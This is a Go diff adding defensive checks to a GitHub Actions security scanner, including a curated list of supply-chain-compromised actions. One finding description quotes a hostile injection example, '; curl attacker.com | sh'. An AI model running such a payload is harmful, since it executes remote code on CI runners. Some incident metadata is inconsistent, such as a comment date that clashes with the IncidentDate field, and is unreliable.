@@ -11,8 +11,11 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"log"
 	"net/http"
+	"net/url"
 	"regexp"
+	"strconv"
 	"strings"
 	"time"
 
@@ -41,7 +44,7 @@ func (s *Scanner) Name() string { return scannerName }
 
 // Run analyses GitHub Actions workflows for the given target.
 // target must be "owner/repo" (e.g. "myorg/myrepo").
-func (s *Scanner) Run(ctx context.Context, target string, _ module.ScanType) ([]finding.Finding, error) {
+func (s *Scanner) Run(ctx context.Context, target string, scanType module.ScanType) ([]finding.Finding, error) {
 	owner, repo, ok := splitOwnerRepo(target)
 	if !ok {
 		return nil, fmt.Errorf("ghactions: invalid target %q — expected owner/repo", target)
@@ -92,6 +95,24 @@ func (s *Scanner) Run(ctx context.Context, target string, _ module.ScanType) ([]
 		all = append(all, checkCachePoisoning(content, repoSlug)...)
 		all = append(all, checkLongLivedCloudCreds(content, repoSlug)...)
 		all = append(all, checkPATUsedInWorkflow(content, repoSlug)...)
+		all = append(all, checkArtifactSigning(content, repoSlug)...)
+		all = append(all, checkReusableWorkflowPinning(content, repoSlug)...)
+		all = append(all, checkWorkflowDispatchInjection(content, repoSlug)...)
+		all = append(all, checkKnownCompromisedActions(content, repoSlug)...)
+		// CI/CD safety-bypass checks
+		all = append(all, checkIssueCommentUnsafe(content, repoSlug)...)
+		all = append(all, checkWorkflowAutoMerge(content, repoSlug)...)
+		all = append(all, checkWorkflowAutoApprove(content, repoSlug)...)
+		all = append(all, checkScheduledWritePermissions(content, repoSlug)...)
+		all = append(all, checkMissingJobTimeout(content, repoSlug)...)
+		all = append(all, checkContinueOnErrorSecurity(content, repoSlug)...)
+	}
+
+	// Deep mode: query the GitHub Advisory Database for any actions advisories
+	// that match actions referenced in these workflows.
+	if scanType >= module.ScanDeep && len(paths) > 0 {
+		advisoryFindings, _ := s.checkAdvisoryDatabase(ctx, repoSlug, owner, repo)
+		all = append(all, advisoryFindings...)
 	}
 
 	return all, nil
@@ -872,6 +893,463 @@ func checkPATUsedInWorkflow(workflowYAML, repo string) []finding.Finding {
 }
 
 // -------------------------------------------------------------------------
+// Artifact signing check
+// -------------------------------------------------------------------------
+
+// reReleaseTriggerAny detects any release or tag-push trigger pattern.
+var reReleaseTriggerAny = regexp.MustCompile(`(?m)^\s*(release:|on:\s*\[.*release|push:.*tags:)`)
+
+// reArtifactProducers detects steps that produce release artifacts.
+var reArtifactProducers = regexp.MustCompile(
+	`(?i)uses:\s*(actions/upload-artifact|goreleaser/goreleaser|softprops/action-gh-release|ncipollo/release-action|svenstaro/upload-release-action)`,
+)
+
+// reArtifactSigning detects signing tools present in the workflow.
+var reArtifactSigning = regexp.MustCompile(
+	`(?i)(sigstore/cosign-installer|github/attest-build-provenance|slsa-framework/slsa-github-generator|anchore/sbom-action|sigstore/gh-action-sigstore-python|sigstore/cosign)`,
+)
+
+// checkArtifactSigning flags release workflows that produce artifacts without signing them.
+func checkArtifactSigning(workflowYAML, repo string) []finding.Finding {
+	if !reReleaseTriggerAny.MatchString(workflowYAML) {
+		return nil
+	}
+	if !reArtifactProducers.MatchString(workflowYAML) {
+		return nil
+	}
+	if reArtifactSigning.MatchString(workflowYAML) {
+		return nil
+	}
+	return []finding.Finding{{
+		CheckID:  finding.CheckGHActionUnsignedRelease,
+		Module:   "github",
+		Scanner:  scannerName,
+		Severity: finding.SeverityMedium,
+		Asset:    repo,
+		Title:    "Release workflow produces artifacts without signing",
+		Description: "A release workflow produces artifacts (via upload-artifact, goreleaser, or a " +
+			"release action) but does not include a signing step (cosign, GitHub Artifact Attestations, " +
+			"or SLSA provenance generation). Unsigned release artifacts cannot be verified by " +
+			"downstream consumers — a compromised artifact upload or storage bucket could silently " +
+			"substitute a malicious binary. Add artifact signing using github/attest-build-provenance " +
+			"or sigstore/cosign-installer, and publish the signature alongside the release.",
+		Evidence:     map[string]any{"vector": "unsigned release artifacts"},
+		DiscoveredAt: time.Now(),
+	}}
+}
+
+// -------------------------------------------------------------------------
+// Reusable workflow pinning check
+// -------------------------------------------------------------------------
+
+// reReusableWorkflowRef matches external reusable workflow references:
+// uses: owner/repo/.github/workflows/foo.yml@ref
+// Group 1 = full ref, Group 2 = ref portion after @
+var reReusableWorkflowRef = regexp.MustCompile(
+	`uses:\s+(([^./\s][^/\s]*/[^/\s]+)/\.github/workflows/[^\s@]+@([^\s#]+))`,
+)
+
+// checkReusableWorkflowPinning flags external reusable workflows not pinned to a full SHA.
+func checkReusableWorkflowPinning(workflowYAML, repo string) []finding.Finding {
+	var findings []finding.Finding
+	seen := make(map[string]struct{})
+
+	for _, m := range reReusableWorkflowRef.FindAllStringSubmatch(workflowYAML, -1) {
+		if len(m) < 4 {
+			continue
+		}
+		fullRef := strings.TrimSpace(m[1]) // e.g. "org/repo/.github/workflows/ci.yml@v1"
+		ref := strings.TrimSpace(m[3])     // e.g. "v1"
+
+		if reFullSHA.MatchString(ref) {
+			continue // already pinned to a commit SHA
+		}
+		if _, ok := seen[fullRef]; ok {
+			continue
+		}
+		seen[fullRef] = struct{}{}
+
+		findings = append(findings, finding.Finding{
+			CheckID:  finding.CheckGHActionReusableWorkflowUnpinned,
+			Module:   "github",
+			Scanner:  scannerName,
+			Severity: finding.SeverityMedium,
+			Asset:    repo,
+			Title:    fmt.Sprintf("Unpinned reusable workflow: %s", fullRef),
+			Description: fmt.Sprintf(
+				"The workflow calls external reusable workflow %q using a mutable tag or branch ref "+
+					"rather than an immutable 40-character commit SHA. If the upstream workflow is "+
+					"compromised or the tag is moved, the next run will silently execute attacker-controlled "+
+					"CI code with access to your repository secrets. Pin to a full SHA: "+
+					"uses: %s@<40-char-sha>  # %s", fullRef, actionBase(fullRef), ref),
+			Evidence:     map[string]any{"reusable_workflow": fullRef, "ref": ref},
+			DiscoveredAt: time.Now(),
+		})
+	}
+	return findings
+}
+
+// -------------------------------------------------------------------------
+// workflow_dispatch input injection
+// -------------------------------------------------------------------------
+
+// reDispatchInputSink matches ${{ inputs.* }} expressions embedded in run: steps.
+var reDispatchInputSink = regexp.MustCompile(`\$\{\{\s*inputs\.\w+\s*\}\}`)
+
+// checkWorkflowDispatchInjection flags run: steps that embed workflow_dispatch inputs directly.
+func checkWorkflowDispatchInjection(workflowYAML, repo string) []finding.Finding {
+	// Only relevant for workflows that have workflow_dispatch trigger.
+	if !strings.Contains(workflowYAML, "workflow_dispatch") {
+		return nil
+	}
+
+	var findings []finding.Finding
+	inRun := false
+	runIndent := 0
+
+	for _, line := range strings.Split(workflowYAML, "\n") {
+		trimmed := strings.TrimSpace(line)
+
+		if isRunKey(trimmed) {
+			inRun = true
+			runIndent = len(line) - len(strings.TrimLeft(line, " \t"))
+		} else if inRun {
+			currentIndent := len(line) - len(strings.TrimLeft(line, " \t"))
+			isNewKey := len(trimmed) > 0 &&
+				!strings.HasPrefix(trimmed, "#") &&
+				currentIndent <= runIndent &&
+				(strings.Contains(trimmed, ": ") || strings.HasSuffix(trimmed, ":")) &&
+				!strings.Contains(trimmed, "${{")
+			if isNewKey {
+				inRun = false
+			}
+		}
+
+		if !inRun {
+			continue
+		}
+
+		m := reDispatchInputSink.FindString(line)
+		if m == "" {
+			continue
+		}
+
+		findings = append(findings, finding.Finding{
+			CheckID:  finding.CheckGHActionWorkflowDispatchInjection,
+			Module:   "github",
+			Scanner:  scannerName,
+			Severity: finding.SeverityCritical,
+			Asset:    repo,
+			Title:    fmt.Sprintf("workflow_dispatch input injected into shell command: %s", m),
+			Description: fmt.Sprintf(
+				"A run: step embeds the workflow_dispatch input expression %q directly in a shell "+
+					"command. Any user with permission to trigger the workflow can supply a value "+
+					"containing shell metacharacters (e.g. `; curl attacker.com | sh`) to execute "+
+					"arbitrary commands on the runner. Use an intermediate environment variable instead:\n"+
+					"env:\\n  VALUE: %s\\nrun: echo \"$VALUE\"", m, m),
+			Evidence:     map[string]any{"injection_sink": m},
+			DiscoveredAt: time.Now(),
+		})
+	}
+	return findings
+}
+
+// -------------------------------------------------------------------------
+// Known-compromised action checks
+// -------------------------------------------------------------------------
+
+// compromisedAction describes a GitHub Action with a documented supply-chain compromise.
+type compromisedAction struct {
+	Slug         string   // "owner/action-name" — matched case-insensitively
+	AffectedRefs []string // specific tags/branches affected; empty = all non-SHA refs
+	CVE          string
+	GHSA         string
+	IncidentDate string // YYYY-MM-DD
+	Summary      string
+	Remediation  string
+}
+
+// knownCompromisedActions is a curated list of confirmed supply-chain incidents.
+// Entries are matched against `uses:` lines in workflow files.
+// Keep entries sorted by incident date (newest first) so the list is easy to audit.
+var knownCompromisedActions = []compromisedAction{
+	{
+		// June 2026: xygeni/xygeni-action had its v5 tag silently moved to a
+		// backdoored commit containing a full C2 reverse shell. The malicious
+		// commit was pushed via compromised maintainer accounts and a Xygeni-owned
+		// GitHub App. PRs were opened and closed without merging; the v5 tag was
+		// moved to the malicious commit on an unmerged branch.
+		Slug:         "xygeni/xygeni-action",
+		AffectedRefs: []string{"v5"},
+		CVE:          "",
+		GHSA:         "",
+		IncidentDate: "2026-03-28",
+		Summary:      "The v5 tag was silently moved to a backdoored commit containing a C2 reverse shell that registered with 91.214.78.178, polled for commands every 2-7 seconds, and executed arbitrary code via eval. Pushed via compromised maintainer accounts.",
+		Remediation:  "Remove all references to xygeni/xygeni-action@v5 immediately. Pin to a verified commit SHA or remove the action entirely. Audit CI runner logs for connections to 91.214.78.178. Rotate any secrets accessible to workflows that ran this action.",
+	},
+	{
+		// March 14-15 2025: all tags on tj-actions/changed-files were moved to a
+		// malicious commit that printed CI runner secrets to workflow logs.
+		Slug:         "tj-actions/changed-files",
+		AffectedRefs: nil, // all non-SHA refs were affected
+		CVE:          "CVE-2025-30066",
+		GHSA:         "GHSA-mrrh-frkj-8544",
+		IncidentDate: "2025-03-15",
+		Summary:      "All version tags were rewritten to point to a malicious commit that exfiltrated CI runner secrets to public workflow logs.",
+		Remediation:  "Pin to a verified post-incident commit SHA. See GHSA-mrrh-frkj-8544 for safe SHAs and audit any run between 2025-03-14 and 2025-03-15.",
+	},
+	{
+		// March 11 2025: reviewdog/action-setup@v1 was modified to inject malware
+		// that exfiltrated secrets from the runner environment.
+		Slug:         "reviewdog/action-setup",
+		AffectedRefs: []string{"v1"},
+		CVE:          "CVE-2025-30065",
+		GHSA:         "GHSA-c2h3-6mxw-7mvq",
+		IncidentDate: "2025-03-11",
+		Summary:      "The v1 tag was modified to inject malware that exfiltrated CI runner secrets.",
+		Remediation:  "Pin to a verified post-incident commit SHA. Audit any run between 2025-03-11 and 2025-03-14.",
+	},
+}
+
+// cdnForkDomains are repository namespaces that host CDN-mirrored forks of
+// popular actions. These forks share the same action name but are distinct
+// repos served from CDN infrastructure. We skip them to avoid false positives
+// when checking for known-compromised actions.
+var cdnForkDomains = []string{
+	"github-mirror/",
+	"ghproxy/",
+	"cdn-actions/",
+	"actions-mirror/",
+	"cached-actions/",
+}
+
+// isCDNFork returns true if the action path appears to be a CDN-hosted fork
+// rather than the canonical upstream action.
+func isCDNFork(actionPath string) bool {
+	lower := strings.ToLower(actionPath)
+	for _, prefix := range cdnForkDomains {
+		if strings.HasPrefix(lower, prefix) {
+			return true
+		}
+	}
+	return false
+}
+
+// checkKnownCompromisedActions flags any `uses:` step referencing a known-compromised action.
+func checkKnownCompromisedActions(workflowYAML, repo string) []finding.Finding {
+	var findings []finding.Finding
+	seen := make(map[string]struct{})
+
+	for _, m := range reUsesStep.FindAllStringSubmatch(workflowYAML, -1) {
+		if len(m) < 3 {
+			continue
+		}
+		fullRef := strings.TrimSpace(m[1]) // "owner/action@ref"
+		ref := strings.TrimSpace(m[2])     // "ref"
+
+		if strings.HasPrefix(fullRef, "./") {
+			continue
+		}
+
+		actionPath := strings.ToLower(actionBase(fullRef))
+
+		// Skip CDN-hosted forks that share the same action name but are
+		// different repos — these should not be flagged as compromised.
+		if isCDNFork(actionPath) {
+			continue
+		}
+
+		for _, bad := range knownCompromisedActions {
+			if strings.ToLower(bad.Slug) != actionPath {
+				continue
+			}
+
+			// If specific refs are listed, only flag those refs.
+			if len(bad.AffectedRefs) > 0 {
+				matched := false
+				for _, aRef := range bad.AffectedRefs {
+					if ref == aRef {
+						matched = true
+						break
+					}
+				}
+				if !matched {
+					continue
+				}
+			} else {
+				// All non-SHA refs were affected — skip if already pinned to a SHA.
+				// (We can't verify the SHA is clean without a known-malicious SHA list,
+				// so SHA-pinned refs are considered safer and not flagged here.)
+				if reFullSHA.MatchString(ref) {
+					continue
+				}
+			}
+
+			key := fullRef
+			if _, ok := seen[key]; ok {
+				continue
+			}
+			seen[key] = struct{}{}
+
+			cveRef := bad.CVE
+			if bad.GHSA != "" {
+				cveRef += " / " + bad.GHSA
+			}
+
+			findings = append(findings, finding.Finding{
+				CheckID:  finding.CheckGHActionKnownCompromised,
+				Module:   "github",
+				Scanner:  scannerName,
+				Severity: finding.SeverityCritical,
+				Asset:    repo,
+				Title:    fmt.Sprintf("Known-compromised action: %s (%s)", fullRef, cveRef),
+				Description: fmt.Sprintf(
+					"The action %q was involved in a confirmed supply-chain attack on %s. %s\n\n"+
+						"Remediation: %s\n\n"+
+						"Advisory: https://github.com/advisories/%s",
+					fullRef, bad.IncidentDate, bad.Summary, bad.Remediation, bad.GHSA),
+				Evidence: map[string]any{
+					"action":        fullRef,
+					"ref":           ref,
+					"cve":           bad.CVE,
+					"ghsa":          bad.GHSA,
+					"incident_date": bad.IncidentDate,
+				},
+				DiscoveredAt: time.Now(),
+			})
+		}
+	}
+	return findings
+}
+
+// ── Deep mode: GitHub Advisory Database ──────────────────────────────────────
+
+// ghAdvisory is the minimal shape we need from the GitHub Advisory Database API.
+type ghAdvisory struct {
+	GHSAID          string `json:"ghsa_id"`
+	CVEID           string `json:"cve_id"`
+	Summary         string `json:"summary"`
+	Severity        string `json:"severity"`
+	Vulnerabilities []struct {
+		Package struct {
+			Ecosystem string `json:"ecosystem"`
+			Name      string `json:"name"`
+		} `json:"package"`
+		VulnerableVersionRange string `json:"vulnerable_version_range"`
+		FirstPatchedVersion    string `json:"first_patched_version"`
+	} `json:"vulnerabilities"`
+}
+
+// checkAdvisoryDatabase queries the GitHub Advisory Database for malware/critical
+// advisories in the `actions` ecosystem and flags any action used in this repo's
+// workflows that appears in the database.
+func (s *Scanner) checkAdvisoryDatabase(ctx context.Context, repoSlug, owner, repo string) ([]finding.Finding, error) {
+	// Collect all action slugs referenced across all workflows.
+	actionSlugs, err := s.collectActionSlugs(ctx, owner, repo)
+	if err != nil || len(actionSlugs) == 0 {
+		return nil, err
+	}
+
+	// Fetch the first page of actions advisories (type=malware covers supply-chain attacks).
+	// We fetch up to 100 entries — enough to catch all published incidents.
+	url := "https://api.github.com/advisories?type=malware&ecosystem=actions&per_page=100"
+	body, err := s.apiGet(ctx, url)
+	if err != nil {
+		// Advisory API is best-effort — non-fatal.
+		return nil, nil //nolint:nilerr
+	}
+
+	var advisories []ghAdvisory
+	if err := json.Unmarshal(body, &advisories); err != nil {
+		return nil, nil //nolint:nilerr
+	}
+
+	var findings []finding.Finding
+	seen := make(map[string]struct{})
+
+	for _, adv := range advisories {
+		for _, vuln := range adv.Vulnerabilities {
+			if strings.ToLower(vuln.Package.Ecosystem) != "actions" {
+				continue
+			}
+			pkgName := strings.ToLower(vuln.Package.Name)
+			if _, used := actionSlugs[pkgName]; !used {
+				continue
+			}
+
+			key := adv.GHSAID + ":" + pkgName
+			if _, ok := seen[key]; ok {
+				continue
+			}
+			seen[key] = struct{}{}
+
+			ref := cveRef(adv)
+			vr := vuln.VulnerableVersionRange
+			if vr == "" {
+				vr = "all versions"
+			}
+
+			findings = append(findings, finding.Finding{
+				CheckID:  finding.CheckGHActionKnownCompromised,
+				Module:   "github",
+				Scanner:  scannerName,
+				Severity: finding.SeverityCritical,
+				Asset:    repoSlug,
+				Title:    fmt.Sprintf("Advisory match: %s uses %s (%s)", repoSlug, vuln.Package.Name, ref),
+				Description: fmt.Sprintf(
+					"The GitHub Advisory Database lists %s as having a supply-chain advisory (%s).\n\n"+
+						"Affected versions: %s\n"+
+						"Summary: %s\n\n"+
+						"Advisory: https://github.com/advisories/%s",
+					vuln.Package.Name, ref, vr, adv.Summary, adv.GHSAID),
+				Evidence: map[string]any{
+					"action":                   vuln.Package.Name,
+					"ghsa":                     adv.GHSAID,
+					"cve":                      adv.CVEID,
+					"vulnerable_version_range": vr,
+					"first_patched_version":    vuln.FirstPatchedVersion,
+				},
+				DiscoveredAt: time.Now(),
+			})
+		}
+	}
+	return findings, nil
+}
+
+// collectActionSlugs fetches all workflow files and returns a set of action slugs
+// (lowercased "owner/action-name") referenced via `uses:` steps.
+func (s *Scanner) collectActionSlugs(ctx context.Context, owner, repo string) (map[string]struct{}, error) {
+	paths, err := s.listWorkflows(ctx, owner, repo)
+	if err != nil {
+		return nil, err
+	}
+	slugs := make(map[string]struct{})
+	for _, path := range paths {
+		content, err := s.fetchWorkflowContent(ctx, owner, repo, path)
+		if err != nil {
+			continue
+		}
+		for _, m := range reUsesStep.FindAllStringSubmatch(content, -1) {
+			if len(m) >= 2 {
+				slug := strings.ToLower(actionBase(strings.TrimSpace(m[1])))
+				if !strings.HasPrefix(slug, "./") {
+					slugs[slug] = struct{}{}
+				}
+			}
+		}
+	}
+	return slugs, nil
+}
+
+// cveRef returns "CVE-XXXX-YYYYY" if present, otherwise the GHSA ID.
+func cveRef(adv ghAdvisory) string {
+	if adv.CVEID != "" {
+		return adv.CVEID
+	}
+	return adv.GHSAID
+}
+
+// -------------------------------------------------------------------------
 // GitHub API helpers
 // -------------------------------------------------------------------------
 
@@ -962,7 +1440,15 @@ func (s *Scanner) isRepoPublic(ctx context.Context, owner, repo string) (bool, e
 }
 
 // apiGet performs an authenticated (if token is set) GET against the GitHub API.
+// If the API returns 403 with rate limit headers, it logs a warning and waits
+// for the rate limit to reset before retrying (once).
 func (s *Scanner) apiGet(ctx context.Context, url string) ([]byte, error) {
+	return s.apiGetRetry(ctx, url, true)
+}
+
+// apiGetRetry is the internal implementation of apiGet with an optional single retry
+// after a rate limit backoff.
+func (s *Scanner) apiGetRetry(ctx context.Context, url string, retryOnRateLimit bool) ([]byte, error) {
 	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
 	if err != nil {
 		return nil, err
@@ -978,6 +1464,38 @@ func (s *Scanner) apiGet(ctx context.Context, url string) ([]byte, error) {
 		return nil, err
 	}
 	defer resp.Body.Close()
+
+	// Handle GitHub API rate limiting: 403 with X-RateLimit-Remaining: 0.
+	if resp.StatusCode == http.StatusForbidden {
+		remaining := resp.Header.Get("X-RateLimit-Remaining")
+		resetHeader := resp.Header.Get("X-RateLimit-Reset")
+
+		if remaining == "0" && resetHeader != "" && retryOnRateLimit {
+			resetUnix, err := strconv.ParseInt(resetHeader, 10, 64)
+			if err == nil {
+				resetTime := time.Unix(resetUnix, 0)
+				waitDuration := time.Until(resetTime)
+
+				// Cap the wait to 60 seconds to avoid blocking too long.
+				if waitDuration > 60*time.Second {
+					log.Printf("[ghactions] GitHub API rate limit exceeded for %s; reset in %s (too long to wait, skipping)", url, waitDuration)
+					return nil, fmt.Errorf("GitHub API %s: rate limit exceeded, resets at %s", url, resetTime.Format(time.RFC3339))
+				}
+
+				if waitDuration > 0 {
+					log.Printf("[ghactions] GitHub API rate limit hit; waiting %s for reset before retrying %s", waitDuration.Round(time.Second), url)
+					select {
+					case <-time.After(waitDuration):
+					case <-ctx.Done():
+						return nil, ctx.Err()
+					}
+					return s.apiGetRetry(ctx, url, false) // single retry
+				}
+			}
+		}
+
+		return nil, fmt.Errorf("GitHub API %s: HTTP %d (rate limited)", url, resp.StatusCode)
+	}
 
 	if resp.StatusCode != http.StatusOK {
 		return nil, fmt.Errorf("GitHub API %s: HTTP %d", url, resp.StatusCode)
@@ -1002,9 +1520,13 @@ func splitOwnerRepo(target string) (owner, repo string, ok bool) {
 	target = strings.TrimPrefix(target, "http://github.com/")
 	target = strings.TrimPrefix(target, "github.com/")
 
-	parts := strings.SplitN(target, "/", 2)
-	if len(parts) != 2 || parts[0] == "" || parts[1] == "" {
+	parts := strings.SplitN(target, "/", 3) // split into at most 3 parts
+	if len(parts) < 2 || parts[0] == "" || parts[1] == "" {
 		return "", "", false
 	}
-	return parts[0], parts[1], true
+	// Strip trailing slashes or extra path segments from the repo name.
+	repo = strings.TrimSuffix(parts[1], "/")
+	// Percent-encode both segments so slashes and path-traversal
+	// sequences cannot escape the intended URL path position.
+	return url.PathEscape(parts[0]), url.PathEscape(repo), true
 }
